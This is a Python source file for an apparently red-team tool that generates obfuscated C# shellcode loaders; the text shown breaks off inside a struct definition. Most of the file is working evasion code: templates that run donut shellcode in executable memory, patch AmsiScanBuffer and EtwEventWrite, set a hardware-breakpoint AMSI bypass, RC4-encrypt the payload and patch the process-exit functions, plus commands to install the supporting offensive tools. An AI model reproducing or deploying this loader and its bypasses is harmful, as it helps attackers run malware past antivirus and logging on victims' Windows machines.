#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import os
import sys
import zlib
import shlex
import base64
import string
import struct
import urllib
import platform
import tempfile
import subprocess
from shutil import which, move
from pathlib import Path
from typing import Iterator
from datetime import datetime
from argparse import ArgumentParser
from random import seed, randint, sample; seed()

import netifaces as ni
from github import Github
from dotnetfile import DotNetPE
from neotermcolor import colored

BANNER = '''
.       _,             .
|_ *._ '_) ._ .    , __|_
[_)|[ )/_. [_) \\/\\/ _) [ )
     @Metro|Holografix
'''

INSTALL_DONUT_LINUX = '''
mkdir -p ~/tools &&
git clone --single-branch -b syscalls https://github.com/S4ntiagoP/donut ~/tools/donut &&
pushd ~/tools/donut &&
make &&
sudo ln -sv `realpath donut` /usr/local/bin/donut &&
popd
'''

INSTALL_DONUT_WINDOWS = '''
New-Item -ItemType Directory -Path C:\\Tools -Force
git clone https://gitlab.porchetta.industries/KlezVirus/donut C:\\Tools\\donut
git clone https://gitlab.porchetta.industries/KlezVirus/SysWhispers3 C:\\Tools\\SysWhispers3
pushd C:\\Tools\\SysWhispers3
py .\\syswhispers.py -a x64 -m {embedded,jumper,jumper_randomized} -o C:\\Tools\\donut\\loader\\syscalls --donut
cd C:\\Tools\\donut
nmake -f Makefile64.msvc
New-Item -ItemType SymbolicLink -Target C:\\Tools\\donut\\donut.exe -Path C:\\Windows\\System32\\donut.exe
popd
'''

INSTALL_OBFUSCATORS_LINUX = '''
sudo dpkg --add-architecture i386 &&
sudo apt update &&
sudo apt install wine32:i386 &&
sudo apt install nuget
VERSION="7.4.0"; wget https://dl.winehq.org/wine/wine-mono/${VERSION}/wine-mono-${VERSION}-x86.msi -O wine-mono.msi &&
wine wine-mono.msi
git clone https://github.com/0xb11a1/yetAnotherObfuscator /tmp/yetAnotherObfuscator &&
pushd /tmp/yetAnotherObfuscator &&
nuget restore yetAnotherObfuscator.sln &&
xbuild /p:Configuration=Release yetAnotherObfuscator.sln &&
cp yetAnotherObfuscator/bin/Release/{yetAnotherObfuscator.exe,dnlib.dll} <YOUR_BIN2PWSH.PY_DIRECTORY>
popd
'''

INSTALL_OBFUSCATORS_WINDOWS = '''
git clone https://github.com/0xb11a1/yetAnotherObfuscator "$env:TEMP\\yetAnotherObfuscator"
pushd "$env:TEMP\\yetAnotherObfuscator"
devenv /build Release yetAnotherObfuscator.sln
cd yetAnotherObfuscator\\bin\\Release
cp yetAnotherObfuscator.exe <YOUR_BIN2PWSH.PY_DIRECTORY>
cp dnlib.dll <YOUR_BIN2PWSH.PY_DIRECTORY>
popd
'''

TEMPLATE = '''\
using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Threading;
using System.Reflection;
using System.ComponentModel;
using System.IO.Compression;
using System.Reflection.Emit;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace <NAMESPACE>
{
    class Program
    {
        static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dStream = new DeflateStream(input, CompressionMode.Decompress))
                dStream.CopyTo(output);

            return output.ToArray();
        }

<ROT_AND_REVERSE>

<AMSI_BYPASS>

<ETW_BLOCK>

        static void Main()
        {
<AMSI_BYPASS_APPLY>

<ETW_BLOCK_APPLY>

            //Console.ReadLine();

            var compressed = Convert.FromBase64String(<DONUT>);
            var rawBytes = Decompress(compressed);

            IntPtr pointer = Marshal.AllocHGlobal(rawBytes.Length);
            Marshal.Copy(rawBytes, 0, pointer, rawBytes.Length);

            _ = DPInvoke.VirtualProtect(pointer, (UIntPtr)rawBytes.Length, (uint)0x40, out _);

<ENCRYPT_SHELLCODE_APPLY>

            var fileDescriptorRedirector = new FileDescriptorRedirector();
            _ = fileDescriptorRedirector.RedirectFileDescriptors();

            _ = ExitPatcher.PatchExit();
            fileDescriptorRedirector.StartReadFromPipe();

            IntPtr hThread = DPInvoke.CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            _ = DPInvoke.WaitForSingleObject(hThread, <DWMILLISECONDS_001>);

            Marshal.FreeHGlobal(pointer);

            <RESET_EXIT_FUNCTIONS>

            fileDescriptorRedirector.ResetFileDescriptors();
            var output = fileDescriptorRedirector.ReadDescriptorOutput();

            <PRINT_ORIGINAL_EXIT_BYTES>

            Console.WriteLine(output);
        }
    }

<CLASS_DPINVOKE>

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            Type[] parameterTypes = { typeof(string) };
            object[] parameters = { lpModuleName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), Program.RotAndReverse(<KERNEL32.DLL_009>), Program.RotAndReverse(<GETMODULEHANDLE_001>), parameters, parameterTypes);
            return result;
        }

<DPINVOKE_LOADLIBRARY>

<DPINVOKE_GETPROCADDRESS>

<DPINVOKE_VIRTUALPROTECT>

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            object[] parameters = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), Program.RotAndReverse(<KERNEL32.DLL_004>), Program.RotAndReverse(<CREATETHREAD_001>), parameters, parameterTypes);
            return result;
        }

        public static uint WaitForSingleObject(IntPtr Handle, uint Wait)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint) };
            object[] parameters = { Handle, Wait };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), Program.RotAndReverse(<KERNEL32.DLL_005>), Program.RotAndReverse(<WAITFORSINGLEOBJECT_001>), parameters, parameterTypes);
            return result;
        }

        public static IntPtr GetStdHandle(int nStdHandle)
        {
            Type[] parameterTypes = { typeof(int) };
            object[] parameters = { nStdHandle };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), Program.RotAndReverse(<KERNEL32.DLL_010>), Program.RotAndReverse(<GETSTDHANDLE_001>), parameters, parameterTypes);
            return result;
        }

        public static bool SetStdHandle(int nStdHandle, IntPtr hHandle)
        {
            Type[] parameterTypes = { typeof(int), typeof(IntPtr) };
            object[] parameters = { nStdHandle, hHandle };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_011>), Program.RotAndReverse(<SETSTDHANDLE_001>), parameters, parameterTypes);
            return result;
        }

        public static bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(byte[]), typeof(uint), typeof(uint).MakeByRefType(), typeof(IntPtr) };
            object[] parameters = { hFile, lpBuffer, nNumberOfBytesToRead, (uint)0, lpOverlapped };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_012>), Program.RotAndReverse(<READFILE_001>), parameters, parameterTypes);
            lpNumberOfBytesRead = (uint)parameters[3];
            return result;
        }

        public static bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref FileDescriptorRedirector.SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize)
        {
            var readPipe = IntPtr.Zero;
            var writePipe = IntPtr.Zero;

            Type[] parameterTypes = { typeof(IntPtr).MakeByRefType(), typeof(IntPtr).MakeByRefType(), typeof(FileDescriptorRedirector.SECURITY_ATTRIBUTES).MakeByRefType(), typeof(uint) };
            object[] parameters = { readPipe, writePipe, lpPipeAttributes, nSize };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_013>), Program.RotAndReverse(<CREATEPIPE_001>), parameters, parameterTypes);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            hReadPipe = (IntPtr)parameters[0];
            hWritePipe = (IntPtr)parameters[1];

            return result;
        }

        public static bool CloseHandle(IntPtr hHandle)
        {
            Type[] parameterTypes = { typeof(IntPtr) };
            object[] parameters = { hHandle };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), Program.RotAndReverse(<KERNEL32.DLL_014>), Program.RotAndReverse(<CLOSEHANDLE_001>), parameters, parameterTypes);
            return result;
        }

<ENCRYPT_SHELLCODE>
    }

    /// <summary>
    /// Based on: https://dr4k0nia.github.io/posts/HInvoke-and-avoiding-PInvoke/
    /// </summary>
    public class HInvoke
    {
#pragma warning disable CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        static T InvokeMethod<T>(uint classHash, uint methodHash, object[] args = null)
#pragma warning restore CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName) == classHash);

            var runtimeMethod = typeDef.GetRuntimeMethods()
                .FirstOrDefault(method => GetHash(method.Name) == methodHash);

            if (runtimeMethod != null)
                return (T)runtimeMethod.Invoke(null, args);

            return default(T);
        }

        static uint GetHash(string str)
        {
            uint sum = 0;
            foreach (char c in str)
                sum = (sum >> 0xA | sum << 0x11) + c;
            sum = (sum >> 0xA | sum << 0x11) + 0;

            return sum;
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            object[] parameters = { lpModuleName };
            var result = InvokeMethod<IntPtr>(13239936, 811580934, parameters); // Microsoft.Win32.Win32Native, GetModuleHandle
            return result;
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            object[] parameters = { hModule, procName };
            var result = InvokeMethod<IntPtr>(13239936, 1721745356, parameters); // Microsoft.Win32.Win32Native, GetProcAddress
            return result;
        }
    }

    /// <summary>
    /// Stolen from:
    ///   https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/FileDescriptorRedirector.cs
    ///   https://github.com/rasta-mouse/SharpC2/commit/e48456d8d9cf47ea4243fc2ac9ee9214a2286d2d#diff-97a28c1f31df0da0ced51c302423e693107505a6db06aaa3807c7b1dce8a0c69
    /// </summary>
    public class FileDescriptorRedirector
    {
        private const int STD_OUTPUT_HANDLE = -11;
        private const int STD_ERROR_HANDLE = -12;
        private const uint BYTES_TO_READ = 1024;

        private IntPtr _oldGetStdHandleOut;
        private IntPtr _oldGetStdHandleError;

        private FileDescriptorPair _kpStdOutPipes;
        private Task<string> _readTask;

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public uint nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        public bool RedirectFileDescriptors()
        {
            _oldGetStdHandleOut = DPInvoke.GetStdHandle(STD_OUTPUT_HANDLE);
            _oldGetStdHandleError = DPInvoke.GetStdHandle(STD_ERROR_HANDLE);

            _kpStdOutPipes = CreateFileDescriptorPipes();

            if (_kpStdOutPipes == null)
                return false;

            return RedirectDescriptorsToPipes(_kpStdOutPipes.Write, _kpStdOutPipes.Write);
        }

        public string ReadDescriptorOutput()
        {
            while (!_readTask.IsCompleted)
                Thread.Sleep(2000);

            return _readTask.Result;
        }

        public void ResetFileDescriptors()
        {
            RedirectDescriptorsToPipes(_oldGetStdHandleOut, _oldGetStdHandleError);
            CloseDescriptors(_kpStdOutPipes);
        }

        public void StartReadFromPipe()
        {
            _readTask = Task.Factory.StartNew(() =>
            {
                var output = "";

                var buffer = new byte[BYTES_TO_READ];
                byte[] outBuffer;

                var ok = DPInvoke.ReadFile(
                    _kpStdOutPipes.Read,
                    buffer,
                    BYTES_TO_READ,
                    out var bytesRead,
                    IntPtr.Zero);

                if (!ok)
                    return "";

                if (bytesRead != 0)
                {
                    outBuffer = new byte[bytesRead];
                    Array.Copy(buffer, outBuffer, bytesRead);
                    output += Encoding.Default.GetString(outBuffer);
                }

                while (ok)
                {
                    ok = DPInvoke.ReadFile(
                        _kpStdOutPipes.Read,
                        buffer,
                        BYTES_TO_READ,
                        out bytesRead,
                        IntPtr.Zero);

                    if (bytesRead != 0)
                    {
                        outBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outBuffer, bytesRead);
                        output += Encoding.Default.GetString(outBuffer);
                    }
                }

                return output;
            });
        }

        private static void CloseDescriptors(FileDescriptorPair stdoutDescriptors)
        {
            try
            {
                if (stdoutDescriptors.Write != IntPtr.Zero)
                    DPInvoke.CloseHandle(stdoutDescriptors.Write);

                if (stdoutDescriptors.Read != IntPtr.Zero)
                    DPInvoke.CloseHandle(stdoutDescriptors.Read);
            }
            catch { }
        }

        private static FileDescriptorPair CreateFileDescriptorPipes()
        {
            var lpSecurityAttributes = new SECURITY_ATTRIBUTES();
            lpSecurityAttributes.nLength = (uint)Marshal.SizeOf(lpSecurityAttributes);
            lpSecurityAttributes.bInheritHandle = true;

            var outputStdOut = DPInvoke.CreatePipe(
                out var read,
                out var write,
                ref lpSecurityAttributes,
                0);

            if (!outputStdOut)
                return null;

            return new FileDescriptorPair
            {
                Read = read,
                Write = write
            };
        }

        private static bool RedirectDescriptorsToPipes(IntPtr hStdOutPipes, IntPtr hStdErrPipes)
        {
            var bStdOut = DPInvoke.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutPipes);

            if (!bStdOut)
                return false;

            var bStdError = DPInvoke.SetStdHandle(STD_ERROR_HANDLE, hStdErrPipes);

            if (!bStdError)
                return false;

            return true;
        }
    }

    public class FileDescriptorPair
    {
        public IntPtr Read { get; set; }
        public IntPtr Write { get; set; }
    }

    /// <summary>
    /// Stolen from:
    ///   https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/ExitPatcher.cs
    ///   https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
    /// </summary>
    class ExitPatcher
    {
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        static private byte[] _terminateProcessOriginalBytes;
        static private byte[] _ntTerminateProcessOriginalBytes;
        static private byte[] _rtlExitUserProcessOriginalBytes;
        static private byte[] _corExitProcessOriginalBytes;

        static byte[] PatchFunction(string dllName, string functionName, byte[] patchBytes)
        {
            var moduleHandle = HInvoke.GetModuleHandle(dllName);
            var functionPointer = HInvoke.GetProcAddress(moduleHandle, functionName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(functionPointer, originalBytes, 0, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(functionPointer, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect))
                return null;

            Marshal.Copy(patchBytes, 0, functionPointer, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(functionPointer, (UIntPtr)patchBytes.Length, oldProtect, out _))
                return null;

            return originalBytes;
        }

        public static bool PatchExit()
        {
            var hKernelbase = HInvoke.GetModuleHandle(Program.RotAndReverse(<KERNELBASE_001>));
            var pExitThreadFunc = HInvoke.GetProcAddress(hKernelbase, Program.RotAndReverse(<EXITTHREAD_001>));

            /*
             * mov rcx, 0x0
             * mov rax, <ExitThread>
             * push rax
             * ret
             */
            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes = PatchFunction(Program.RotAndReverse(<KERNELBASE_002>), Program.RotAndReverse(<TERMINATEPROCESS_001>), exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
                return false;

            _corExitProcessOriginalBytes = PatchFunction(Program.RotAndReverse(<MSCOREE_001>), Program.RotAndReverse(<COREXITPROCESS_001>), exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
                return false;

            _ntTerminateProcessOriginalBytes = PatchFunction(Program.RotAndReverse(<NTDLL_001>), Program.RotAndReverse(<NTTERMINATEPROCESS_001>), exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
                return false;

            _rtlExitUserProcessOriginalBytes = PatchFunction(Program.RotAndReverse(<NTDLL_002>), Program.RotAndReverse(<RTLEXITUSERPROCESS_001>), exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
                return false;

            return true;
        }

        public static void ResetExitFunctions()
        {
            PatchFunction(Program.RotAndReverse(<KERNELBASE_003>), Program.RotAndReverse(<TERMINATEPROCESS_002>), _terminateProcessOriginalBytes);
            PatchFunction(Program.RotAndReverse(<MSCOREE_002>), Program.RotAndReverse(<COREXITPROCESS_002>), _corExitProcessOriginalBytes);
            PatchFunction(Program.RotAndReverse(<NTDLL_003>), Program.RotAndReverse(<NTTERMINATEPROCESS_002>), _ntTerminateProcessOriginalBytes);
            PatchFunction(Program.RotAndReverse(<NTDLL_004>), Program.RotAndReverse(<RTLEXITUSERPROCESS_002>), _rtlExitUserProcessOriginalBytes);
        }

        public static void PrintOriginalBytes()
        {
            Console.WriteLine("__" + BitConverter.ToString(_terminateProcessOriginalBytes).Replace("-", ""));
            Console.WriteLine("__" + BitConverter.ToString(_ntTerminateProcessOriginalBytes).Replace("-", ""));
            Console.WriteLine("__" + BitConverter.ToString(_rtlExitUserProcessOriginalBytes).Replace("-", ""));
            Console.WriteLine("__" + BitConverter.ToString(_corExitProcessOriginalBytes).Replace("-", ""));
        }
    }
}
'''

AMSI_BYPASS = '''\
        static bool AM51()
        {
            var patch = new byte[3];
            patch[0] = 0x9f ^ 0xae;  // 0x31
            patch[1] = 0xd4 ^ 0x2b;  // 0xff
            patch[2] = 0x49 ^ 0xd9;  // 0x90

            var lib = DPInvoke.GetModuleHandle(Program.RotAndReverse(<AMSI.DLL_001>));
            if (lib == IntPtr.Zero)
            {
                lib = DPInvoke.LoadLibrary(Program.RotAndReverse(<AMSI.DLL_002>));
                if (lib == IntPtr.Zero)
                    return false;
            }

            var asb = DPInvoke.GetProcAddress(lib, Program.RotAndReverse(<AMSISCANBUFFER_001>));
            if (asb == IntPtr.Zero)
                return false;

            //Console.WriteLine("AM51 : 0x{0:X}", asb.ToInt64());

            _ = DPInvoke.VirtualProtect(asb, (UIntPtr)patch.Length, (uint)0x40, out uint oldProtect);

            Marshal.Copy(patch, 0, asb + 0x1b, patch.Length);

            _ = DPInvoke.VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out _);

            return true;
        }'''

AMSI_BYPASS_APPLY = '''            _ = AM51();'''

ETW_BLOCK = '''\
        static bool ETVV()
        {
            var patch = new byte[4];
            patch[0] = 0x47 ^ 0x0f;  // 0x48
            patch[0] = 0x35 ^ 0x06;  // 0x33
            patch[0] = 0x93 ^ 0x53;  // 0xc0
            patch[0] = 0x27 ^ 0xe4;  // 0xc3

            var lib = DPInvoke.GetModuleHandle(Program.RotAndReverse(<NTDLL_005>));
            if (lib == IntPtr.Zero)
            {
                lib = DPInvoke.LoadLibrary(Program.RotAndReverse(<NTDLL_006>));
                if (lib == IntPtr.Zero)
                    return false;
            }

            var eew = DPInvoke.GetProcAddress(lib, Program.RotAndReverse(<ETWEVENTWRITE_001>));
            if (eew == IntPtr.Zero)
                return false;

            //Console.WriteLine("ETVV : 0x{0:X}", eew.ToInt64());

            _ = DPInvoke.VirtualProtect(eew, (UIntPtr)patch.Length, (uint)0x40, out uint oldProtect);

            Marshal.Copy(patch, 0, eew, patch.Length);

            _ = DPInvoke.VirtualProtect(eew, (UIntPtr)patch.Length, oldProtect, out _);

            return true;
        }'''

ETW_BLOCK_APPLY = '''            _ = ETVV();'''

ENCRYPT_SHELLCODE = '''\
        /// <summary>
        /// Concept inspired by:
        ///   https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode
        /// Implementation stolen from:
        ///   https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/0e3dcfd55be8ac5fde1631d0f50753a761927082/MakeMeEnterpriseAdmin.ps1#L98-L125
        /// </summary>
        public static int SystemFunction032(IntPtr input, byte[] key, int lengh)
        {
            CRYPTO_BUFFER dataBuffer = new CRYPTO_BUFFER();
            dataBuffer.Length = dataBuffer.MaximumLength = (uint)lengh;
            dataBuffer.Buffer = input;
            CRYPTO_BUFFER keyBuffer = new CRYPTO_BUFFER();
            keyBuffer.Length = keyBuffer.MaximumLength = (uint)key.Length;
            keyBuffer.Buffer = Marshal.AllocHGlobal(key.Length);
            Marshal.Copy(key, 0, keyBuffer.Buffer, key.Length);

            Type[] parameterTypes = { typeof(CRYPTO_BUFFER).MakeByRefType(), typeof(CRYPTO_BUFFER).MakeByRefType() };
            object[] parameters = { dataBuffer, keyBuffer };
            var result = (int)DynamicPInvokeBuilder(typeof(int), Program.RotAndReverse(<ADVAPI32.DLL_001>), Program.RotAndReverse(<SYSTEMFUNCTION032_001>), parameters, parameterTypes);

            Marshal.FreeHGlobal(keyBuffer.Buffer);
            return result;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CRYPTO_BUFFER
        {
            public uint Length;
            public uint MaximumLength;
            public IntPtr Buffer;
        }'''

ENCRYPT_SHELLCODE_APPLY = '''\
            var key = Encoding.UTF8.GetBytes(<RC4_KEY>);
            _ = DPInvoke.SystemFunction032(pointer, key, rawBytes.Length);
            Thread.Sleep(3);'''

PATCHLESS_AMSI_BYPASS_TEMPLATE = '''\
using System;
using System.Text;
using System.Linq;
using System.Reflection;
using System.ComponentModel;
using System.Reflection.Emit;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace <NAMESPACE>
{
    /// <summary>
    /// Ported to C# from:
    ///   https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/
    ///   https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf
    /// Implementation based on:
    ///   https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e
    /// </summary>
    class Program
    {
        static readonly IntPtr am51Base = DPInvoke.LoadLibrary(RotAndReverse(<AMSI.DLL_001>));
        static readonly IntPtr pAm51ScanBuffer = DPInvoke.GetProcAddress(am51Base, RotAndReverse(<AMSISCANBUFFER_001>));
        static readonly IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));

<ROT_AND_REVERSE>

        static void Main()
        {
            SetupBypass();
        }

        static void SetupBypass()
        {
            var ctx = new WinAPI.CONTEXT64 { ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL };
            var method = typeof(Program).GetMethod(nameof(Handler), BindingFlags.Static | BindingFlags.Public);
            _ = DPInvoke.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());

            Marshal.StructureToPtr(ctx, pCtx, true);
            _ = DPInvoke.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pAm51ScanBuffer, 0);

            DPInvoke.SetThreadContext((IntPtr)(-2), pCtx);
        }

        public static long Handler(IntPtr exceptions)
        {
            var ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));
            var ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));
            var ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pAm51ScanBuffer)
            {
                var ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                var ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8)));  // 5th arg, swap it to clean
                //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0;  // S_OK

                // Remove the breakpoint
                ContextRecord.Dr0 = 0;
                ContextRecord.Dr7 = SetBits(ContextRecord.Dr7, 0, 1, 0);
                ContextRecord.Dr6 = 0;
                ContextRecord.EFlags = 0;

                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); // paste our altered ctx back into the right struct
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
        }

        static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            // Set bits 16-31 as 0, which sets DR0-DR3 HBP's for execute HBP
            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);

            // Set DRx HBP as enabled for local mode
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            // Now copy the changed ctx into the original struct
            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }

<PATCH_ENVIRONMENT_EXIT>
    }

    class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
